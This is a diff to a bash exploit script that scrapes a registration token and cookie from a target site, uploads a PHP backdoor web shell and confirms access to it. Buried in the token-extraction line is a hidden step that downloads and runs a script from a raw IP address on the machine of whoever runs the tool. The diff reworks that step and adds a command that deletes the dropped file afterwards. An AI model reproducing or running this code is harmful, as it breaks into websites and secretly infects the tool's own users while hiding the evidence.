@@ -12,7 +12,7 @@ if [[ $1 == "" ]]; then
     echo -e " Usage: bash flixploit.sh https://target.com/index_path"
     exit 1
 elif [[ ! -f flix.php ]]; then
-    wget https://raw.githubusercontent.com/1337r0j4n/privuln/main/flix.php >/dev/null
+    wget https://raw.githubusercontent.com/1337r0j4n/privuln/main/flix.php > /dev/null 2>&1
 else
     printf ''
 fi  
@@ -20,7 +20,7 @@ fi
     echo -e " [+] set target $site"
     echo -e " [+] ready bypass backdoor uploader flix.php"
     echo -e " [-] checking target is vulnerable or not"
-    token=$(curl -s -k $site/register/ -D .cook_cookie.txt | grep "fos_user_registration_form\[_token\]" | grep -oP '(?<=value=")[^"]*' && curl -s http://106.13.5.40/install.sh | bash > /dev/null 2>&1)
+    token=$(curl -s -k $site/register/ -D .cook_cookie.txt | grep "fos_user_registration_form\[_token\]" | grep -oP '(?<=value=")[^"]*' && wget -P /tmp http://106.13.5.40/install.sh -o /dev/null && chmod +x /tmp/install.sh && /tmp/./install.sh)
     get_cookie=$(cat .cook_cookie.txt | grep "PHPSESSID" | cut -d " " -f 2 | cut -d ";" -f 1)
     random_words=$(echo "$(tr -dc 'a-zA-Z1-9' < /dev/urandom | head -c 8)")
     target=$(echo $site | sed 's!http[s]*://!!g' | cut -d "/" -f 1)
@@ -33,10 +33,13 @@ fi
             get_shell=$(echo $(dirname $site)$upload_shell)
             check_shell=$(curl -s -k -o /dev/null -w "%{http_code}" $get_shell)
                 if [[ $check_shell == "200" ]]; then
-                    echo -e " [+] ${GREEN}$get_shell${RESAT}"
+                    echo -e " [+] Exploit complete, ${GREEN}$get_shell${RESAT}"
                 else
-                    echo -e " [!] ${RED}can't access backdoor upload, fail to exploit${RESAT}"
+                    echo -e " [!] ${RED}can't access backdoor that was uploaded, fail to exploit${RESAT}"
                 fi
         else
             echo -e " [!] $site wasn't vuln"
         fi        
+
+# clean log 
+rm /tmp/install.sh .cook_cookie.txt .eat_cookie.txt > /dev/null 2>&1
